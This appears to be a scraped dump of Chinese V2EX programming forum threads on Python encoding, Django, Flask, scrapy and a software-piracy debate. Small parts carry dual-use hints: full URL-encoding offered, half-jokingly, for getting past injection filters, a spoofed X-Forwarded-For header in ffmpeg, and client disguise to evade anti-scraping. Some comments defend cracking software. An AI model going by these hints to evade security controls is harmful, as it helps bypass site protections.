需要的就买 用一次的就可以找到替代品 比如 istat 这样的软件 好多替代品挺好的 :) 虽然 sublime 那个编辑器 确实快,但是日常还是 vsc 这个就多等上几秒休息一下. 课程的话 建议去看 gitbook 这个比较靠谱,建议直接看文档 锻炼英语一下. 学习有关的工具毕竟要用正版的,因为给了太多帮助!", "违反著作权的事情太多了。\r", "不仅仅是软件，包括视频，音乐，文章等等。\r", "\r", "随便说一个，你们知道将音乐翻唱以后上传是侵犯著作权的吗？\r", "再随便说一个，你们知道日本动画的同人小黄本都是侵犯著作权的吗？\r", "再再随便说一个，你们知道 AB 站上拿素材剪辑的 MAD 都是侵犯著作权的吗？\r", "再再再随便说一个，你们知道 P 站上以原作为范本自己画一些同人图也都是侵犯著作权的吗？\r", "\r", "我不打算判别谁对谁错，只是随便陈述一些法律事实，其中是非请看官自行判断。", " 不是说你", " \r", " \r", "\r", "然而大部分商业软件都没有可用的开源 /免费版本", "有道理。我觉得版权这东西还是技术对弈比较好，大家各凭本事，你能破解算你牛逼。技术搞不定，那么诉诸法律也是个很合理的选择。但是作道德评判就最没意思了。", " \r", "\r", "有道理。我觉得 财产 这东西还是肉体对弈比较好，大家各凭本事，你能抢劫算你牛逼。打架搞不定，那么诉诸法律也是个很合理的选择。但是作道德评判就最没意思了。", "去推动立法，推动更严厉的反盗版法、正版权益保护法，这是 **唯一的** 解决办法", " 你不说我还没发现，财产在这方面更体现了这一点啊。谁没事去评判抢劫的。被抢了最多是上来哭诉，警告别人不要去什么地方，再加谴责警察办事不力。谁家里不装锁，开着大门被偷了，甚至都不好意思出来说，只能默默怪自己。", "只有法律才能让用盗版者受到惩罚。如果法律不保护版权，那么 \r", "\r", "现在法律是没用的：\r", "等于 A 花几百块买的软件 B 可以花零元用到同样效果\r", " => A 和 B 用到的是同样效果的软件，但 A 可以指责 B \r", " => AB 用的东西一样， A 花了几百块买到的是 “骂人的权利” 。\r", "\r", "这显然是有问题的，因为 B 作为盗版者没有受到惩罚。而唯一的办法就是让 B 受到惩罚。只有法律是唯一的办法", "憑自己找的註冊碼 為什麼要叫偷", " 这个程序员这么多的地方说这种话，是不是有点欠缺考虑？\r", "没钱就应该不用，谁没用过盗版，但如果因为没钱就用的心安理得，是不是家教不好？我想你的爸妈不会教你没钱就去偷吧，软件传播成本低，但即使再低，用盗版还是等同于偷东西。", "这些人不是拥护正版，只是利益相关。", " @", " @", " 传播盗版，和利用盗版赚钱，比单纯用盗版恶劣得多吧？我想表达的意思是如果是经济问题，用盗版没想的那么恶劣，注意我不是说可以用得心安理得，当然大佬们的想是，连个软件都买不起这得多穷啊，我也是理解的，对不起，目前我还真的买不起，当我没说过吧", "# 不明觉厉", " 没有区别。 50 步笑百步", " 我凭自己在路边找到好多车，为什么要叫偷", "买不起而用盗版，那肯定是偷偷地用，不敢声张。有免费版就尽量用免费版。", "其实 LZ 这逼装的才叫一个 6", " 我大概就是这个意思，结果被喷成狗😂", " lol", "看到很多人说因为太贵所以不得不用盗版\r", "\r", "这样的强盗逻辑就像  豪华别墅太贵不得不偷偷跑进去住\r", "\r", "用盗版就用盗版，没必要非得给自己找个正当理由", "并没有“都是”\r", "我一直在自己的课程里推荐 pycharm ，而且反复明确说社区版就足够用了\r", " 你用过盗版不？你现在还在用盗版不？\r", "\r", "虽然现在电脑上的软件 绝大多数 都是正版的了，但从来不认为自己有资格去指责别人用盗版。\r", "\r", "当然我们期望大家都用正版是对的，然而这样的事情并不大可能通过指责别人来达到，只能是自己尽量做得更好。", " 不知哪里戳中你的神经了，我没有批评用盗版，我批评的是用着盗版还要给自己找一堆开脱的理由\r", "\r", "另外， No offense  我特别讨厌您这种犬儒主义心态", " 看你说得这么 正气凛然 我只是好奇一下而已，然而你并没有回答我的问题。", "想想这样一个场景,\"一个抠脚大汉，用着盗版 windows,录着“” 21 天速成 XX 的课程“。。。。。。。。我也是醉了", " sorry ，用词不严谨，但看一些网易云课程、慕课的 python 都是这样，而且课程中使用的功能用 vsc 也没什么障碍，貌似没必要推荐 PyCharm", "精神分裂\r", "\r", "不就是精神分裂么，中国有 8000 万精神病， 1600 万重症精神病。\r", "\r", "见怪不怪", " 我没用过 vsc ，但 pycharm 在 windows 上有个好处是可以通过设置，避免系统默认 gbk 编码带来的坑。\r", "\r", "有时候推荐的目的只是为了减少麻烦，毕竟做一个课，面向的人群很广，不限制环境，那什么问题都出来了", " 通过设置 cmd 也可以支持 utf8 ，而且推荐 cmder 不是更好吗", "我用的某品牌国产手机想逃掉高通专利费，难道授权费用高就是你不交钱的理由？", "举国抨击高通， v2 支持正版，有种东西​因为国情，叫做政治正确", " 乱举例子， v2 就是多了这种人，以为自己很吊", "说得我们不想用正版一样？总是坫在道德的最高点去批评别人，真恶心。大学生能有几个钱，买得正版？出社会工作都要指定会几个软件，是熟练！学生时代不学，难道毕业出来先打杂工攒钱买正版？别说 PS,ai 这些，连 Ms 三件套都未必能正版。\r", "Anyway,别误会，我会支持正版。但请先结合国情，再谈实际。我也不为使用盗版伸正义。但至少，这种现况，它是合理，", "比如，设计类要求，熟练各种 CAD", "因为，少了那点钱，对于 PyCharm 的作者来说不是吃不起饭的地步。 PyCharm 依然能很好发展。\r", "而讲课的老师大部分都是白领，付出了时间就要回报，否则，他的生活立即困顿。\r", "\r", "这就是差别。 国外的福利相对于国内好点，这个你得承认。\r", "\r", "不要用发达国家的标准要求发展中国家，就和农民想要提升自己老老实实种一辈子菜，这辈子都买不起北京一个厕所。", "windows 我用 insider preview ，编辑器用 vscode ，无聊看小说我用 QQ 阅读，开发文档我基本都是看的官方的文档，音乐用网易云音乐（这个应该算是正版？），感觉就除了看美剧（还有那些电影院没上映的电影）是看盗版的。。。", " 我记得同人本不属于违反著作权的行为，当时好像就闹了一番，最后判定说不算", " 之前在网站上放了一张别人画的同人雷姆，结果吃到一张来自官方的版权通告，服务器直接被关机。\r", "\r", "This is a notification of copyright infringement.\r", "\r", "IP: ××××\r", "\r", "We found cases of copyright infringements on the pages below:\r", "Original Work: Re: Zero ( ", " )\r", "https×××××\r", "\r", "I have a good faith belief that use of the copyrighted materials \r", "described above as allegedly infringing is not authorized by the \r", "copyright owner, its agent, or the law.\r", "I swear, under penalty of perjury, that the information in the \r", "notification is accurate and that I am the copyright owner or am \r", "authorized to act on behalf of the owner of an exclusive right that is \r", "allegedly infringed.\r", "\r", "I ask you to take down this content within 48 hours and I would be \r", "grateful if you could send me a short message when you have accomplished \r", "the deletion.\r", "\r", "Best regards,\r", "\r", "Abuse Team\r", "Copyright Media Solutions", " 好像是 如果版权方默许，就允许这么干 的节奏", " 本来就是民事，默许的话当然可以干，但是也意味着什么时候不默许了你就死了……", " 11 区记得是除非事前做出明确声明，否则默认允许在一定范围内同人衍生", " 说是怎样说，但是真的上了法庭，看的还是法律条文。", " #11 \r", "其实大部分人经济允许……\r", "你看他玩游戏买皮肤买枪都上千的砸……", " 我记得好像曾经出过因为同人上的法庭，最后版权方败诉的事情什么的\r", "\r", "嗯，肯定我记错了..."]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>基础介绍:</p>\n<ol>\n<li>主表 package 每天新增的数据量可能达到 10w 条, 预计生命周期 3 年吧(1 亿条), 不准备水平拆分</li>\n<li>有一个 condition 表, package 根据基础信息, 在 condition 表中找到合适的 condition, 保存其外键, 留作后续统计使用</li>\n<li>django 项目</li>\n</ol>\n<p>主要问题:\npackage 的基础信息, 有 3 组: 预估信息, 校验信息, 最终信息, 三组结构基本一致\n如果保存 condition 的外键, 根据三组信息, 会保存三套外键</p>\n<p>在考虑是否需要使用 django 的 OneToOneField 进行 package 表的拆分\n将大表拆分成 两张 或 三张 小表</p>\n<p>优越的地方是 结构清晰, 主表大小降低了\n但不确定的是:</p>\n<ol>\n<li>是否有拆分的必要</li>\n<li>使用 OneToOneField, 是不是一个相对比较标准的方式</li>\n<li>除了删除不同步(但是业务并不需要删除), OneToOne 字段是否有其他问题</li>\n</ol>\n<p>谢谢!</p>\n</div></div>"], "reply": "5", "tittle": "django 求教数据库设计, 是否需要进行大表拆小表", "comment": ["我觉得没这个必要，如果列很多，直接指定要返回的字段就好，不过实在要拆用 OneToOneField 是挺好的，删除的问题指定好 on_delete 就行了，我记默认就是 cascade", "1 ：关于是否需要拆分，需要确认的是， django 在做数据查询时， ORM 是否会把所有数据都带出来（也就是 Select * 和 Selece 特定字段的区别）。还有一个情况就是字段的存储的大小，如果都是小字段，其实没有太大的拆分必要。如果存储的字段都是大字段，我觉得还是有拆分的必要的。\r", "2 ：建议还是用 OneToOne 的方式吧，这样可以保持一个数据库结构的完整性\r", "3 ：其他问题，暂时未知。\r", "\r", "ps ：如果 LZ 不准备做水平拆分，目前只考虑垂直拆分。只需要从存储的字段大小以及 ORM 的性能上来考虑。如有不正确的地方，请斧正。", " @", " \r", "感谢回复, 主要是至少三组数据, 每组数据有 4~5 个字段, 其中有 1~2 个是外键\r", "如果全部存一张表, 那么担心 \r", "1. 外键太多, 一张表有十几个, 担心不太好. 个人对数据库设计, 并没有太深刻的理解, 只是喜欢一般一张表 20 个字段左右, 这样理解, 记忆什么的比较方便\r", "2 未来如果进行业务扩展, 因为只有一张表, 那么担心这张表会过大(目前 3 组, 全部 30 个字段左右了, 扩展 2 组数据, 会有四十多个字段, 感觉表很冗余了)\r", "最终, 选择的方案是拆分成两张表, 原则是根据业务的主次进行拆分, 主要业务放主表, 然后将辅助性的数据(相对不常用)全部放到扩展表中, 后续如果进行扩展, 也按照这个原则, 将字段添加到对应的表中. \r", "没有根据数据逻辑, 因为根据数据逻辑, 拆分的不止两张表, 那样有点太多, 所以折中使用业务逻辑拆分.\r", "\r", " 想做水平拆分, 但是使用 django+mysql 不太会, 后面准备使用的方案是进行数据归档, 当数据量增长到一定程度, 将历史数据从原表中 copy 到另一张表(或者数据库), 再从原表中删除(以当前的技术水平, 这个方案可行性最高了,,,,,,,见笑了)\r", " orm 默认不会带出所有的外键对象的数据, 如果需要, 指定 select_related('foreignkey')即可, 相对来说, django orm 是真的强大+易用的", "像你这种情况，不应该通过 onetotone 拆成多张表，因为你的 package 表的数据太多，一旦主表通过外建来 join 子表，开销非常大。按照你的情况，你应该就保持一张 package 表，然后通过 proxy model （ ", " ）来定义几种子类", "  十分感谢(还很细心的提供了文档链接)"]},
{"content": ["<div class=\"topic_content\">xshell 登录 linux 执行执行下面命令：\r<br>python3 test.py '你好' \r<br>这一句目前是直接手动执行的，以后计划 php 内通过 exec()来执行\r<br>\r<br>tesp.py 里面：\r<br>str = sys.argv[1]\r<br>print(str)  //打印出来是“你好”\r<br>\r<br>if str == \"你好\":\r<br>  print('ok') //这一句没有输出，说明二者并不相同\r<br>\r<br>下面这两句\r<br>print('你好'.encode('utf-8'))      \r<br>print(str.encode('utf-8')) \r<br>\r<br>第一句正常输出： // b'\\xe4\\xbd\\xa0\\xe5\\xa5\\xbd'\r<br>第二句报错： UnicodeEncodeError: 'utf-8' codec can't encode character '\\udce4'\r<br>\r<br>我想知道传递过来的参数，究竟发生了什么变化，明明都是“你好”，怎么会不一样  \r<br>因为后面有一步关键操作需要 str.encode('utf-8') ，怎么样才能让它不报错？</div>"], "reply": "16", "tittle": "又一次被编码问题整晕了，求解救", "comment": ["第二句不是已经提示是 utf-8 了吗", "sys.argv 传入的是 Unicode ，不需要 encode 吧？", "会不会 str 已经是 unicode 了 所以不用 encode 了", "写错了 str 已经不是 unicode 了 不用 encode 了", "额。。。貌似说错了，应该说是 sys.argv 传入的是 UTF-8 ，不需要 encode ，然后 Python 内部声明的都是 Unicode 所以要 encode 成其他的。。。", "不写 encode ， python 2 3 下都正常。写 encode ， python 2 失败， 3 正常。\r", "mac 下 iterm 运行的。不知楼主怎么回事。直接打印看看？", "✗ python --version\r", "Python 3.6.0\r", "\r", "✗ cat test.py\r", "import sys\r", "\r", "str = sys.argv[1]\r", "print(str)\r", "print(type(str))\r", "if str == \"你好\":\r", "  print(\"ok\")\r", "print('你好'.encode('utf-8'))\r", "print(str.encode('utf-8'))\r", "\r", "✗ python test.py '你好'\r", "你好\r", "<class 'str'>\r", "ok\r", "b'\\xe4\\xbd\\xa0\\xe5\\xa5\\xbd'\r", "b'\\xe4\\xbd\\xa0\\xe5\\xa5\\xbd'\r", "\r", "\r", "可能我用了假 python ……", " 即是说通过参数传递进来的 str 本身就是 utf-8 编码的字符串？\r", "因为我后面要用某个库里的一个函数需要对 str 执行 encode('utf-8')，里面的代码不方便改动，\r", "那么在此之前，我需要的把 str 变成普通的字符串，然后确保 str.encode('utf-8')能顺利执行，请问这需要怎么做", " 升级一下 python 版本？", "unicode 才要 encode\r", "byte string 才要 decode", " 他已经是 python 3 了", " decode 试试 我也是新手", "代码（ python2.7 ）：\r", "\r", "# -*- coding: utf8 -*-\r", "import sys\r", "\r", "str = sys.argv[1] \r", "print str #打印出来是“你好” \r", "\r", "if str == \"你好\": \r", "\tprint 'ok'  #打印 ok\r", "\r", "print '你好'.encode('utf-8') # 这行报错\r", "print str.encode('utf-8')\r", "\r", "打印信息如下：\r", "你好\r", "ok\r", "Traceback (most recent call last):\r", "  File \"test.py\", line 10, in <module>\r", "    print '你好'.encode('utf-8')\r", "UnicodeDecodeError: 'ascii' codec can't decode byte 0xe4 in position 0: ordinal not in range(128)\r", "\r", "python2 的话，如果文件编码和终端编码相同，应该会打印出 ok 的。\r", "python3 的话，我这边是没问题的，都是正常的，和#7 一致。", " \r", " \r", " \r", " \r", " \r", " \r", " \r", "\r", "谢谢各位，问题暂时解决了，\r", "str.encode('utf-8','surrogateescape')\r", "这样就没问题了\r", "\r", "不过编码解码这一块，我确实得花点功夫研究一下，\r", "不然每次遇到问题都要折腾好久，太痛苦了", " 长见识了，赶紧学习了一波 surrogateescape", "推荐阅读： "]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>正好公司里有需要，网上没找到合适的实现，自己用 Python 轮了一个。</p>\n<p>算法照抄 <a href=\"https://github.com/facebook/mention-bot\" rel=\"nofollow\">https://github.com/facebook/mention-bot</a> ， 部分地方根据 Gitlab 做了适配</p>\n</div></div>"], "reply": "3", "tittle": "Mention-bot for Gitlab", "comment": ["补上链接： ", "尴尬。。。", "哈哈，沙发太热情了。"]},
{"content": ["<div class=\"topic_content\">比如 admin 在用 urllib 的 quote 时还是 admin ，希望能够对非特殊字符也进行 URL 编码，变为%61%64%6D%69%6E\r<br>\r<br>Google 的好半天没有查到，求高手解答！</div>"], "reply": "11", "tittle": "求问 Python 如何进行全部字符的 URL 编码？", "comment": ["你抄一下官方库代码, 自己写个函数把这个限制去掉不就好了, 就几句代码", "re.sub(r'.', lambda m: '%%%s' % m.group(0).encode('hex').upper(), 'admin')", "a = b'admin'\r", "b = ''.join('%{:02X}'.format(x) for x in a)\r", "print(b)", "对英文字符也编码的好处或者用处是啥？", "urllib2.quote", "admin ? 你该不会是想通过 url encode 的方式 来搞 sql 防注入之类的 东东吧? 慎之。", " 感谢~懒得自己改了,想看看有没有直接能用的，我在 python2.7 中试 format 里的 x 还需要加 ord~", " 学习了~re 的 sub 还可以这么用", " 感谢~", " 是完全 URL 编码， quote 只编码影响 URL 的特殊字符", " 测试用途\r", " 当然不是 绕过注入防护还差不多~"]},
{"content": ["<div class=\"topic_content\">新手刚开始学习． <a target=\"_blank\" href=\"https://segmentfault.com/q/1010000008939688\" rel=\"nofollow\">https://segmentfault.com/q/1010000008939688</a> 这里有详细描述．谢谢．</div>", "<div class=\"topic_content\">此贴终结，谢谢大家热情帮助．</div>"], "reply": "15", "tittle": "scrapy 爬取知乎内容，发现获取的和原网页不一样啊，请问这是什么原因？", "comment": ["这是反爬策略吧", " 用到什么策略，可以详细说说吗？还有如何解决呢？谢谢．", "你可以用 chromedrive 试试  如果还是不一样 那就说明确实有反爬的问题~", "可能是页面异步获取了其他内容，所以直接抓取看不到，其中策略比较多\r", "\r", "有问题可以加我们的群问，这样效率更高，这个群是一群工程师组建的面向初学者的 python Linux 学习群（ qq 群号： 278529278 ） 非商业性质，拒绝广告，只接收真正想学这方面技术的朋友，交流学习，申请请说明来自 v2ex", "好多异步请求", "我也以为是异步，可是禁用 js 后的页面和我获取的页面还是不一样", " \r", " 好的，我试试．．谢谢．", "javascript ，", "直接抓现成的 json 包，伪装客户端发包", "你说的原网页是指的网页源代码还是审查元素？审查元素的代码是经过 js 渲染过的，不一样是很正常的，这个要以网页源代码的为标准，如果网页源代码和爬虫爬的不一样，另说，有可能是防爬。", " 网页源代码不一样．．．主要是一个 css 文件不一样，结果导致我写的 xpath 和 response.css 全部为空．．．这种是防爬吗？", " 应该是防爬了，防爬一般来就是根据 header 和 cookie 下文章，再有就是根据 ip 频率", " 不是防爬，还是 js 问题，我用 selenium+Phantomjs 成功解决．", " 如果是 js 问题，那么网页源代码和你抓取的应该是一样的，你用 Phantomjs ，还是因为有些 dom 是 js 动态生成的。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><h3>业务是这样:</h3>\n<p>服务端有个任务队列,我提供了一个接口,客户端每调一次,返回队列的头任务后并移除该任务,理想情况下是每个任务都被客户端正常获取到.</p>\n<p>但是我用 gevent(wsgi 服务器)+flask 来实现这样的接口时遇到一个问题,就是不能确定是否成功返回了数据,客户端可能压根没收到,万一出现这样的情况,这个任务任务就也被移除并丢失了,比如下面这样的代码.</p>\n<pre><code>@app.route(\"/gettask\", methods=['GET', 'POST'])\ndef gettask():\n    return 'task' #这里不是函数,我不知道最后没有有成功返回给客户端\n</code></pre>\n<hr>\n<h3>目前思路:</h3>\n<p>1.直接用 socket 开发接口,比如调用其 sendall(),这种是可以判断成功与否的,但这是最后的选择</p>\n<p>2.客户端要在成功取到一个任务后再通知服务端,然后接口才移除该任务(这里需要超时机制,客户端也需要确保通知被服务端成功收到了)</p>\n<p>3.不管,听天由命了-_-!</p>\n</div></div>"], "reply": "12", "tittle": "flask 框架开发 api 接口,当 wsgi 服务器层返回失败时该如何处理业务.", "comment": ["1. socket 的 sendall 并不能保证对方已经收到，所以你第一个思路行不通\r", "2. 这是比较可行的方式，但是也要考虑一种情况，客户端收到了，但是应答的时候出故障了", "这个任务队列是什么东西", " \r", "socket 层面出现数据丢失的问题可以不考虑了,就认为 TCP 协议是可靠的,否则用第 2 个思路也是死循环了", " \r", "可以理解为\r", "[1,2,3,4,5,6,7,8,9,....]", "你这个需求跟 flask 、 api 和 wsgi 服务器 都没关系。\r", "\r", "新开一个 API 接受回调吧。", " TCP 协议是可靠的，然而 sendall 只是把数据从应用的 buf 复制到内核 buf 就返回了，还没开始 TCP 层面的传输呢", " \r", " \r", "看来需要在应用层增加确认", "分成 2 个接口：\r", "1. 获取队列头，如果客户端获取失败可以不断重试\r", "2. 根据任务 ID 删除队列中的任务，如果删除失败也可以不断重试\r", "\r", "然后就没法保证一个任务只被一个客户端拿到了。。。", "新开 API 接受回调＋ 1", " \r", " \r", "知道怎么做了,谢谢各位大佬", "新开 API 接受回调＋ 2", "其实你要关注的不是客户端有没有收到，而是有没有处理\r", "如果客户端收到之后崩了呢？要不要重试？\r", "直接和重试机制做到一起就 OK 了\r", "多少时间内没有收到处理完成的确认就让其他人重试，当然任务本身得是幂等的"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>买的通配符证书，有个 php 写的 web 跑在 apache 上完全正常。\n另一个flask服务在 gunicorn 上配置后，间歇性报 ssl 连接失败。\n各位有遇到过吗？</p>\n</div></div>"], "reply": "2", "tittle": "求教， gunicorn 上 https 连接间歇性出错问题", "comment": ["难道不应该前面挂个 nginx 或者 haproxy 来处理 https 通讯，转发成 http 给后端？", " 说的好，我已经在挂 nginx 了"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>当 list 很长时候 几万行</p>\n<p>例如 data =[[...],[...],...]\nlen(data)  为  40000\nlen(data[0]) 为  200</p>\n<p>numpy.mat(data).shape 结果为(1 ， 40000)</p>\n<p>不能转为矩阵，预期结果为（ 40000 ， 200 ）</p>\n<p>但是 len(data)比较小的时候，能得到预期结果</p>\n<p>求助！！！</p>\n</div></div>"], "reply": "8", "tittle": "求助！！！ Python 二维 list 无法转为矩阵", "comment": ["up ! ! !", "不调用函数试试", " 不调用函数怎么转。。本来是二维 list ，转为 matix", "看看你的 data 里是不是有某一行不是 200 个元素", "同 4 楼. 另外. 你应该把为什么不能转换的异常信息给出来吧..", " 好的我看看", " 转的结果 shpae (1 ， 40000)，没抛异常", " 是这个原因 thank you"]},
{"content": ["<div class=\"topic_content\">在代码里加上 headers 后访问正常，请问有什么办法能用 FFmpeg 正常解析？</div>"], "reply": "8", "tittle": "使用 FFmpeg 命令解析 ", "comment": ["写个代理帮着加 header 呗", " 代理是什么意思？", "  FFmpeg 命令里不能直接加 header 是吧？", " ", " 应该可以直接加吧", "m3u8 的就算连上也很不稳定……", " Nginx", "不才与劣者认为你可以直接在 ffmpeg 加上 header\r", "\r", "`ffmpeg -v 9 -loglevel 99 -headers \"X-Forwarded-For: 160.53.186.194\" -i ", " \r", " \r", " \r", " \r", "谢谢各位热心帮助"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>想搭建一个音乐服务器，用哪个分布式文件系统比较合适啊，最好支持 python 接口，有什么好的方案吗</p>\n</div></div>"], "reply": "1", "tittle": "想搭建一个音乐服务器，用哪个分布式文件系统比较合适啊，有什么好的方案吗", "comment": ["koel 满足你的需求\r"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>由于某些原因，无法在一个 filter 里执行添加所有的 or 条件</p>\n<p>所以有以下情况：\n已经存在一个 query</p>\n<p><code>query = session.query(User).filter(or_(<a href=\"http://User.id\" rel=\"nofollow\">User.id</a> == 2,<a href=\"http://User.id\" rel=\"nofollow\">User.id</a> == 3))</code></p>\n<p>↑上面这个 query 的代码无法修改</p>\n<p>此时 sql 语句为 SELECT * FROM USER WHERE id=2 or id =3;</p>\n<p>此时还需要添加一个条件 or_(<a href=\"http://User.id\" rel=\"nofollow\">User.id</a> == 4,<a href=\"http://User.id\" rel=\"nofollow\">User.id</a> == 5)</p>\n<p>如果这样做：</p>\n<p><code>query = query.filter(or_(<a href=\"http://User.id\" rel=\"nofollow\">User.id</a> == 4,<a href=\"http://User.id\" rel=\"nofollow\">User.id</a> == 5))</code></p>\n<p>则 sql 语句变为</p>\n<p>SELECT * FROM USER WHERE id=2 or id =3 AND (id=4 or id =5)</p>\n<p>我期望的结果是</p>\n<p>SELECT * FROM USER WHERE id=2 or id =3 OR id=4 or id =5</p>\n<p>请问要怎么办？</p>\n</div></div>"], "reply": "3", "tittle": "SqlAlchemy 中，一个 query 如何多次执行 filter 添加 or 条件？", "comment": [".union 一下就可以。", "c = [User.id == 2, User.id == 3]\r", "\r", "if xxx:\r", "   c += [User.id == 4,User.id == 5]\r", "\r", "q = session.query(User).filter(or_(*c))", "方案 1 （推荐）：解决掉“某些原因”，采用楼上的答案；\r", "方案 2 （不推荐）：如果没法解决“某些原因”，看 SQLAlchemy 源码，\r", "人肉提取需要重写的条件（如示例的 `or_(User.id == 2,User.id == 3)`），\r", "再重写该过滤条件 （修改 query._criterion ）。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>在 python schedule 模块中执行循环，循环中包含了导入 pyv8 模块，报错『*** JSError: JSError: &lt;CALL_AND_RETRY_0&gt; Allocation failed - process out of memory 』;\n我试了把导入 pyv8 模块的动作单独放在一个循环中或者单独放在一个 schedule 任务中，都可以正常执行，但放在一起就会出现循环走不下去的情况\n测试代码为：</p>\n<pre><code>from apscheduler.schedulers.blocking import BlockingScheduler\nfrom pyv8 import PyV8\n\n\ndef test():\n    print \"do\"\n    for i in range(1, 10):\n        print i\n        ctxt = PyV8.JSContext()\n\nsched = BlockingScheduler()\nsched.add_job(test, 'interval', seconds=5)\nsched.start()\n</code></pre>\n<p>运行结果：</p>\n<pre><code>$ python leaktest.py\ndo\n1\nNo handlers could be found for logger \"apscheduler.executors.default\"\ndo\n1\ndo\n1\ndo\n1\ndo\n1\ndo\n1\n</code></pre>\n<p>请问有人碰到过这种情况吗？有解决方法吗？谢谢</p>\n</div></div>"], "reply": "2", "tittle": "求助，在 schedule 模块的循环中导入 pyv8 报错且循环不能走到下一步", "comment": ["def test():\r", "    print \"do\"\r", "    for i in range(1, 10):\r", "        print i\r", "        with PyV8.JSLocker():\r", "            ctxt = PyV8.JSContext()", " 修改后有效，十分感谢！"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>4 月份给自己挖一个爬虫系列的坑，主要涉及 HTTP 协议、正则表达式、 Request 、 BeautifulSoup 、 Xpath 、异步并发爬虫、 Scrapy 、消息队列、数据库等内容。</p>\n<p>这是第一篇： <a href=\"https://foofish.net/understand-http.html\" rel=\"nofollow\">爬虫入门系列（一）：快速理解 HTTP 协议</a></p>\n<p>不知对爬虫感兴趣的有无有？</p>\n</div></div>"], "reply": "19", "tittle": "给自己挖了一个 Python 爬虫系列的坑", "comment": ["你问我资不资次，我当然是资次的", "有。", "一周一个爬虫坑。。。", "学习爬虫中～", "就看这个坑有多深了，已入", "可以再加一个 selenium 哇 scrapy 的 splash 没太用过~js 还是推一发 selenium 来处理", "正在学习中，已添加收藏", "marked, 期待数据入库！", "期待 ing~", "你可能需要[Python 全栈之路系列文章]( ", ")", "这个系列来一波很 nice ！", "看了楼主的模拟知乎登录爬虫教程觉得不错，已 fork", "证书挂了还是被攻击了？", "支持楼主开坑，已收藏", "当然有。", "在爬微信公众号文章。。。。", " 证书过期了", "支持支持", "好顶赞"]},
{"content": ["<div class=\"topic_content\">从 08 年的云计算到现在的大数据，还只会搭建 hadoop 环境的小朋友，我就不说什么了。没有接触过 hadoop 的同学，也不必迷茫。\r<br>\r<br>现在各大公司的要求，普遍需要 2-3 年的经验，不过只要你技术过硬，这也都是浮云。如果你只会搭建环境，我想机会也不大吧？\r<br>\r<br>大数据是一个概念， hadoop 是来实现这个概念的工具、技术，它们之间并没有绝对的联系。 Hadoop 作为一代分布式系统的基础，特别是第二代 Hadoop YARN 推出以后，这个位置更加牢固。目前在市面上并没有可以与之相匹敌的系统存在。\r<br>\r<br> 怎么才能学好 Hadoop ，进入大数据的世界，这里给几点建议：\r<br>\r<br>1.首先，不管你之前有没有接触过 hadoop ，或者你在某个方向特别牛逼，你都要有空杯心态，这才是学习的根据。\r<br>2. 你要有编程基础，比如 Java ， C ， python ， linux ，不一定要在某个方向多么牛逼，有这些基础学起来就会很快上手。\r<br>3. 详细研究，现在大型网站包括 Sina ，腾讯网（门户）， Weibo （微博），天猫，京东（电商）的架构与实现，先从自己的角度去理解，然后去跟实际情况做比对，提升自己对数据和技术的敏感程度。\r<br>4.熟悉，理解，并运用 Hadoop 对于你以后在大型计算机公司任职非常重要（阿里，腾讯，百度内部的系统或多或少都是借鉴于 Hadoop 的）。\r<br>5. 科班的同学，在学校的以基础为根基，在公司的以业务为导向，这样的技术才不盲目，这样的技术才脚踏实地。\r<br>6.不过， Hadoop 说到底只是一项分布式系统的工具，学习的本质是：理解分布式系统设计中的原则以及方法，例如负载均衡，故障恢复，并发程序设计，并发数据结构，等等。理解这些设计原理，并走入底层读懂每一行 Hadoop 的源码更加的重要\r<br>\r<br>对很多人来说，技术都不是一生的职业导向，那么，提升自己的眼界，站在更高的角度思考问题就显得尤为重要，\r<br>从自己，到团队，公司，再到整个业界，眼界宽广了，技术也就是你的左膀右臂。\r<br>\r<br>hadoop 只是云计算的一隅，任何东西学的深入了都会发生质变。\r<br>\r<br>福利分享：\r<br>\r<br>我有一套 hadoop 大数据视频，授课老师是百度 hadoop 核心架构师\r<br>内容主要是讲 hadoop 平台的搭建、使用，以及在这个平台上完成数据挖掘。\r<br>讲的很细致， MpaReduce 就讲了 15 个小时。\r<br>学完后可以胜任 hadoop 的开发工作，很多人学的这个课程找到的工作。\r<br>（包括指导书、练习代码、和用到的软件都打包了）\r<br>\r<br>有想学 hadoop 的免费送给你，加我微信 ganshiyu1026 下载，备注 V2EX</div>", "<div class=\"topic_content\">经 wyntergreg 同学批评指正，文中 MpaReduce 改正为 MapReduce</div>"], "reply": "11", "tittle": "想学好 hadoop 大数据，你要知道这 6 点", "comment": ["MapReduce 能不能拼对，我这门外汉看了都尴尬\r", "\r", "一项技术开始发各种教学视频的时候，离烂到家也就不远了\r", "\r", "最近各种吐槽 hadoop 生态的声音倒是不少", " 马上改  手指头常在键盘上游走，难免失误", " 人红是非多，大家还是应该根据自己的需求来看待问题", "震惊！学好 Hadoop 必知这 6 点", "本来以为六点就六行。。。。。。", "只想问一句，有几十个 G 的数据提供练习吗？", "加微信是什么套路有知道的吗？", "楼上的, 不知道呀", "加群的功夫 谷歌下他们的社区就好了 无视微信", "简单的看了下，视频不错", " 我是真心不喜欢 hadoop 。可惜这边的公司就特么只知道 hadoop 。。。"]},
{"content": ["<div class=\"topic_content\">折腾了几下，学学停停感觉 py 也算过了一次语法，现在想做个小工具来实战。定时任务这块，老司机有什么建议吗？</div>"], "reply": "3", "tittle": "py 做定时任务，是用 corntab 还是有模块可以做", "comment": ["celery", "apscheduler", "也可以简单写，不断睡觉检测时间来做定时也可以。"]},
